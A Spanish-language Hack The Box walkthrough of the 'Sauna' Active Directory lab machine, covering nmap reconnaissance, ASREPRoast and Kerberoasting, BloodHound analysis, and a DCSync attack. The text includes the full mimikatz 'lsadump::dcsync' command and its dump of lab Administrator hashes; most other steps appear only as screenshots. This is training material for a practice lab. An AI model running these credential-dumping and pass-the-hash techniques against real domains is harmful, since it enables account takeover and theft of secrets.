---
layout: single
title: Sauna - Hack The Box
excerpt: "Máquina bastante buena para aprender lo básico de Active Directory. Vamos a poder efectuar un ASREPRoast Attack a demás de un Kerberoasting Attack y un DCSync Attack, así que vamos a ello."
date: 2022-03-20
classes: wide
header:
  teaser: /assets/images/htb-writeup-sauna/sauna_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
   - hackthebox
   - infosec
tags:
   - Windows
   - Active Directory
   - ASREPRoast Attack
   - Kerberoasting Attack
   - WinPEAS
   - BloodHound	(SharpHound.ps1)
   - DCSync Attack (mimikatz)
   - Path The Hash
---

![](/assets/images/htb-writeup-sauna/sauna_logo.png)

# Reconocimiento

Vamos a empezar con un reconocimiento de puertos, escaneando todo el rango de puertos **TCP** que estén abiertos.

```bash

h3g0c1v@kali:~/htb/sauna$ nmap -sS --min-rate 5000 -p- --open -T5 -v -n -Pn 10.10.10.175 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-20 09:59 CET
Initiating SYN Stealth Scan at 09:59
Scanning 10.10.10.175 [65535 ports]
Discovered open port 139/tcp on 10.10.10.175
Discovered open port 80/tcp on 10.10.10.175
Discovered open port 445/tcp on 10.10.10.175
Discovered open port 53/tcp on 10.10.10.175
Discovered open port 135/tcp on 10.10.10.175
Discovered open port 49673/tcp on 10.10.10.175
Discovered open port 636/tcp on 10.10.10.175
Discovered open port 49677/tcp on 10.10.10.175
Discovered open port 49674/tcp on 10.10.10.175
Discovered open port 9389/tcp on 10.10.10.175
Discovered open port 49696/tcp on 10.10.10.175
Discovered open port 5985/tcp on 10.10.10.175
Discovered open port 389/tcp on 10.10.10.175
Discovered open port 593/tcp on 10.10.10.175
Discovered open port 464/tcp on 10.10.10.175
Discovered open port 49667/tcp on 10.10.10.175
Discovered open port 49689/tcp on 10.10.10.175
Discovered open port 88/tcp on 10.10.10.175
Completed SYN Stealth Scan at 10:00, 26.30s elapsed (65535 total ports)
Nmap scan report for 10.10.10.175
Host is up (0.036s latency).
Not shown: 65517 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49677/tcp open  unknown
49689/tcp open  unknown
49696/tcp open  unknown

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.42 seconds
           Raw packets sent: 131066 (5.767MB) | Rcvd: 32 (1.408KB)


```

Seguiremos lanzando unos scripts básicos de enumeracion, y detectando la versión y servicio que corren para los puertos abiertos. Como hay unos cuantos puertos abiertos, haré uso de un *stylesheet* para visualizar mejor la información.

```bash

h3g0c1v@kali:~/htb/sauna$ nmap -sCV -p53,80,88,135,139,389,445,464,593,636,5985,9389,49667,49673,49674,49677,49689,49696 --stylesheet=https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/stable/nmap-bootstrap.xsl -oX targetedXML -oN targeted 10.10.10.175
Nmap scan report for 10.10.10.175
Host is up (0.036s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Egotistical Bank :: Home
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-03-20 16:01:55Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-03-20T16:02:48
|_  start_date: N/A
|_clock-skew: 6h59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Mar 20 10:03:23 2022 -- 1 IP address (1 host up) scanned in 95.81 seconds

```

De forma que, si ahora copiamos el fichero en el que hemos guardado la información, lo metemos en el directorio `/var/www/html/` y activamos el servicio de **apache**, vemos la información representada de una forma más vistosa.

![](/assets/images/htb-writeup-sauna/targetedXML.png)

Vemos que hay un dominio, por lo que lo meteré en mi `/etc/hosts/` para que resuelva a la máquina víctima.

```bash
h3g0c1v@kali:~/htb/sauna$ cat /etc/hosts                    
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: /etc/hosts
       │ Size: 221 B
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 127.0.0.1   localhost
   2   │ 127.0.1.1   kali
   3   │ 
   4   │ 10.10.10.175    EGOTISTICAL-BANK.LOCAL
   5   │ 
   6   │ # The following lines are desirable for IPv6 capable hosts
   7   │ ::1     localhost ip6-localhost ip6-loopback
   8   │ ff02::1 ip6-allnodes
   9   │ ff02::2 ip6-allrouters
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Como el puerto 80 está abierto, voy a aplicar un poco más de reconocimiento sobre el, haciendo uso de la herramienta **whatweb**.

```bash
h3g0c1v@kali:~/htb/sauna$ whatweb http://10.10.10.175          
http://10.10.10.175 [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[example@email.com,info@example.com], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.175], Microsoft-IIS[10.0], Script, Title[Egotistical Bank :: Home]
```

Vamos a visualizar la página web a ver que hay.

![](/assets/images/htb-writeup-sauna/webpage.png)

Si investigamos la página, hay una seccion en donde hay usuarios que pueden ser válidos a nivel de dominio. 

![](/assets/images/htb-writeup-sauna/userspage.png)

Por lo que me los guardare en un fichero, con un formato adecuado a usuarios de dominio.

![](/assets/images/htb-writeup-sauna/users.png)

Ahora, como tenemos un fichero con usuarios, vamos a válidarlos y en caso de que alguno sea válido, vamos a ver si podemos visualizar su hash **Net-NTLMv2**.

![](/assets/images/htb-writeup-sauna/asrep.png)

El usuario *fsmith* es válido a nivel de dominio y vemos que podemos visualizar su hash **NTLM** , así que intentaremos **crackearlo** de forma offline.

![](/assets/images/htb-writeup-sauna/crack.png)

Ahora que tenemos su contraseña vamos a validarlo con **crackmapexec** , para ver si es válida, o incluso si podemos conectarnos con **evil-winrm**.

![](/assets/images/htb-writeup-sauna/pwnedcme.png)

Antes de conectarnos con **evil-winrm** , como tenemos un usuario con su respectiva contraseña del dominio, vamos a intentar efectuar un **Kerberoasting Attack**
Primero, validaré que hay algun usuario que es **Kerberoasteable** , y en caso de que haya alguno, le pedire su **TGS**, con el que podremos crackearlo de forma offline.

![](/assets/images/htb-writeup-sauna/kerber.png)

El usuario *hsmith* es **Kerberoasteable** , por lo que hemos podido pedir su **TGS**. Ese hash que nos ha extraido, lo podemos intentar crackearlo de forma offline, así que vamos a ello.

![](/assets/images/htb-writeup-sauna/cracktgs.png)

Bueno, el usuario *fsmith* y *hsmith* utilizan la misma contraseña. Vamos a validar que es válida esa contraseña, de nuevo con crackmapexec.

![](/assets/images/htb-writeup-sauna/pwnedkerbcme.png)

Ahora que tenemos dos usuarios, vamos a conectarnos con el primero que hemos encontrado, para ver que podemos hacer.

![](/assets/images/htb-writeup-sauna/fsmithconnect.png)

Con el usuario *fsmith* voy a tirar el **winPEASx64.exe**, para realizar un reconocimiento extenso sobre la máquina victima. Posteriormente visualizare lo que me ha reportado dicha herramienta.

![](/assets/images/htb-writeup-sauna/winPEASexe.png)

¡Ojo! vemos una contraseña del usuario *svc_loanmanager*. Pero si hacemos un **net user**, vemos que no hay ningun usuario con dicho nombre, pero hay un usuario al que se le parece.

![](/assets/images/htb-writeup-sauna/netuser.png)

Como se parecen bastante, vamos a probar a ver si es su contraseña.

![](/assets/images/htb-writeup-sauna/svcpwned.png)

Y efectivamente, es su contraseña, por lo que vamos a conentarnos con él ya que nos pone *pwned* el *crackmapexec*.

![](/assets/images/htb-writeup-sauna/svc_connect.png)

Con este usuario, lo que voy a hacer, es tirar el **BloodHound** , haciendo uso del ingestor **SharpHound.ps1**.

![](/assets/images/htb-writeup-sauna/sharphoundps1.png)

Este **.zip** que nos ha extraido lo metemos en el **BloodHound** . Ahora que lo tenemos importado, vamos a ver cual es la forma mas rápida de escalar privilegios. Recordad que tenemos pwneados a los usuarios *fsmith*, *hsmith* y *svc_loanmgr*, por lo que lo tenemos que marcar como pwned en el bloodhound.

![](/assets/images/htb-writeup-sauna/fasterlpe.png)


# DCSync Attack

Si observamos, vemos que con el usuario *svc_loanmgr* tenemos los permisos **GetChanges** y **GetChangesAll** sobre el dominio. Esto significa que podemos realizar un **DCSync Attack** . El ataque lo podemos realizar de varias maneras, yo lo hare de dos maneras. La primera la realizare haciendo uso de la herramienta **impacket-secretsdump** y la segunda con **mimikatz**.

Empezare con **impacket-secretsdump**.

![](/assets/images/htb-writeup-sauna/secretsdump.png)

Y ahora lo haré con **mimikatz**.

```bash
*Evil-WinRM* PS C:\Windows\Temp\LPE> upload /home/kali/Escritorio/HTB/MachinesHTB/Sauna/content/mimikatz.exe
Info: Uploading /home/kali/Escritorio/HTB/MachinesHTB/Sauna/content/mimikatz.exe to C:\Windows\Temp\LPE\mimikatz.exe

                                                             
Data: 1666740 bytes of 1666740 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Windows\Temp\LPE> C:\Windows\Temp\LPE\mimikatz.exe 'lsadump::dcsync /domain:egotistical-bank.local /user:Administrator' exit

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # lsadump::dcsync /domain:egotistical-bank.local /user:Administrator
[DC] 'egotistical-bank.local' will be the domain
[DC] 'SAUNA.EGOTISTICAL-BANK.LOCAL' will be the DC server
[DC] 'Administrator' will be the user account

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 7/26/2021 9:16:16 AM
Object Security ID   : S-1-5-21-2966785786-3096785034-1186376766-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: 823452073d75b9d1cf70ebdf86c7f98e
    ntlm- 0: 823452073d75b9d1cf70ebdf86c7f98e
    ntlm- 1: d9485863c1e9e05851aa40cbb4ab9dff
    ntlm- 2: 7facdc498ed1680c4fd1448319a8c04f
    lm  - 0: 365ca60e4aba3e9a71d78a3912caf35c
    lm  - 1: 7af65ae5e7103761ae828523c7713031

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 716dbadeed0e537580d5f8fb28780d44

* Primary:Kerberos-Newer-Keys *
    Default Salt : EGOTISTICAL-BANK.LOCALAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
      aes128_hmac       (4096) : a9f3769c592a8a231c3c972c4050be4e
      des_cbc_md5       (4096) : fb8f321c64cea87f
    OldCredentials
      aes256_hmac       (4096) : 987e26bb845e57df4c7301753f6cb53fcf993e1af692d08fd07de74f041bf031
      aes128_hmac       (4096) : 145e4d0e4a6600b7ec0ece74997651d0
      des_cbc_md5       (4096) : 19d5f15d689b1ce5
    OlderCredentials
      aes256_hmac       (4096) : 9637f48fa06f6eea485d26cd297076c5507877df32e4a47497f360106b3c95ef
      aes128_hmac       (4096) : 52c02b864f61f427d6ed0b22639849df
      des_cbc_md5       (4096) : d9379d13f7c15d1c

* Primary:Kerberos *
    Default Salt : EGOTISTICAL-BANK.LOCALAdministrator
    Credentials
      des_cbc_md5       : fb8f321c64cea87f
    OldCredentials
      des_cbc_md5       : 19d5f15d689b1ce5

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  b4a06d28f92506a3a336d97a66b310fa
    02  71efaf133c578bd7428bd2e1eca5a044
    03  974acf4f67e4f609eb032fd9a72e8714
    04  b4a06d28f92506a3a336d97a66b310fa
    05  79ba561a664d78d6242748774e8475c5
    06  f1188d8ed0ca1998ae828a60a8c6ac29
    07  801ddc727db9fa3de98993d88a9ffa8b
    08  a779e05da837dd2d303973304869ec0f
    09  ac2c01846aebce4cbd4e3ec69b47a65d
    10  6d863d6ae06c3addc49b7a453afe6fa0
    11  a779e05da837dd2d303973304869ec0f
    12  6676b9fdd4aa7f298f1ada64c044c230
    13  5a01167d750636d66e5602db9aece9b7
    14  f702282bd343c2fee7b98deac8950390
    15  a099aa3c81f1affeba59d79a6533f60d
    16  4bae84b8f0b0306788ff9bda4acb3bd4
    17  976d547fb9e04b0ac5ec60508c275da1
    18  50c302b71d0e08a1a2be14b56225645f
    19  edb19e08653443695f6d3599e0a6bddf
    20  c497465ddc6e2fc14cb0359d0d5de7f8
    21  2ed0b4b57196fb190a66224b2b17029f
    22  37d03051ae1cd6046975948564ab01fa
    23  d4c7554fe1beb0ed712f50cfec470471
    24  8df495fe69cdce409b9f04ea04289b9e
    25  40788044be982310920cc0740687fefd
    26  db7f66f1f1a8f46274d20cfdda5b6e1c
    27  d70226ec52f1ef198c2e1e955a1da9b6
    28  abdd681f875a9b3f3a50b36e51692a2c
    29  dcd140a2ce2bf70fed7ac0e2b60d0dee


mimikatz(commandline) # exit
Bye!
```


# Root

Una vez hecho esto podemos coger la parte **NT** del hash del usuario **Administrator** , y hacer un **Path The Hash** con él.

![](/assets/images/htb-writeup-sauna/paththehash.png)

En este punto, podemos irnos al directorio `C:\Users\Administrator\Desktop` y visualizar la flag.

![](/assets/images/htb-writeup-sauna/roottxt.png)

Espero que te haya gustado la máquina *Sauna*, tienes más como esta en mi página web.
